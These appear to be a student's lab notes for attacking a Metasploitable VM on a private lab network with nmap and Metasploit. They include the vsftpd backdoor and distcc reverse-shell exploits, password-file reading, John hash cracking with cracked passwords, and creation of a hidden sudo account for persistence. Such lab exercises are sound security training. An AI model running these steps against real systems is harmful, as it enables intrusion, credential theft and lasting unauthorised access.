Key commands include:
msfconsole: Launches MSFconsole from the command line
show + the module type: Displays all the available modules (for example: show auxiliary)
search and then a keyword: Searches for modules based on a keyword
use + module name: Selects a specific module (for example: use scanner/ftp/anonymous)
info: Displays the module details as well as the required and optional options
OR options: Just displays the options available for the module
exploit OR run: Runs the module

```

┌──(root💀kali)-[~]
└─# nmap -sV 172.22.117.150
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 20:42 EDT
Nmap scan report for 172.22.117.150
Host is up (0.023s latency).
Not shown: 976 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
2222/tcp open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:15:5D:00:04:06 (Microsoft)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.65 secondsms



msf6 > search vsftp

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > search smtp-enum
[-] No results from search
msf6 > search smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum

msf6 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey

msf6 >


----------------------------------------------

`setup and exploit/run`

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  172.22.117.150   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me
                                      tasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 172.22.117.150:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.22.117.150:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 172.22.117.150:21 - The port used by the backdoor bind listener is already open
[+] 172.22.117.150:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.22.117.100:35089 -> 172.22.117.150:6200 ) at 2025-04-02 20:50:32 -0400

ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media

search distcc

use 0

search distcc.
use 0 or use exploit/unix/misc/distcc_exec.

1. In Metasploit, search for `distcc` and select it. 

   - `search distcc` 
   
   - `use 0` or `use exploit/unix/misc/distcc_exec`

   ![A screenshot depicts the results of the commands.](../Images/searchdistcc.PNG)

   - Explain that `distcc` is a tool for compiling code. It runs as a daemon with low permissions, and this version is vulnerable. 

2. List the options of the module, and point out that we need to set RHOSTS again as it is a required option.

   - `set RHOSTS 172.22.117.150`

3. Before running the module, we need to set a payload. List the available payloads.

   - `show payloads`
   
   - Point out the **Description** column, as it shows in parentheses how the payload is communicating.

4. Select the **reverse** payload. Be sure NOT to select **reverse_bash**, or the exploit will not work.

   - `set PAYLOAD cmd/unix/reverse`
   
   - Note that we are now using the PAYLOAD with our EXPLOIT!

5. List options again, and point out that there's a new blank setting, LHOST. This is our "listening host," which is the host that listens for the payload communication. In this case, our LHOST is the machine that we're currently operating on. Use `ifconfig` to show your IP (eth0) and set LHOST to that IP.

   - `set LHOST 172.22.117.100`

   ![A screenshot depicts the results of the `options` command.](../Images/payloadoptions.PNG)

6. Run the module.

   - `exploit` OR `run`

   ![A screenshot depicts the results of the command.](../Images/distcc.PNG)

7. Check your current user via `id`.

   - `id`

find / -type f -iname "*admin*.txt"

cat /var/tmp/adminpassword.txt

ssh msfadmin@172.22.117.150
pass: cybersecurity

ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@172.22.117.150

just doing `sudo su` with this password I became root

-------------------------------------------------------------------------------------

root@ip-10-0-1-231:/home/sysadmin# john crack.txt 
Loaded 6 password hashes with 6 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
postgres         (postgres)
user             (user)
service          (service)
123456789        (klog)
cybersecurity    (msfadmin)
Password!        (tstark)
6g 0:00:00:07 100% 2/3 0.7832g/s 12758p/s 12764c/s 12764C/s Sss2..Password!
Use the "--show" option to display all of the cracked passwords reliably
Session completed

-------------------------------------------------------------------------------------

┌──(root💀kali)-[~]
└─# ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -p 2222 msfadmin@172.22.117.150         255 ⨯
msfadmin@172.22.117.150's password:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Sat Mar 29 13:42:16 2025 from 172.22.117.100
msfadmin@metasploitable:~$

-------------------------------------------------------------------------------------

root@metasploitable:/home/msfadmin# useradd -m -s /bin/bash system-ssh
root@metasploitable:/home/msfadmin# echo "system-ssh:password" | sudo chpasswd
root@metasploitable:/home/msfadmin# usermod -aG sudo system-ssh
root@metasploitable:/home/msfadmin#
root@metasploitable:/home/msfadmin# cat /etc/passwd | grep system-ssh
system-ssh:x:1005:1005::/home/system-ssh:/bin/bash



┌──(root💀kali)-[~]
└─# ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -p 2222 system-ssh@172.22.117.150
system-ssh@172.22.117.150's password:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/

-------------------------------------------------------------------------------------

```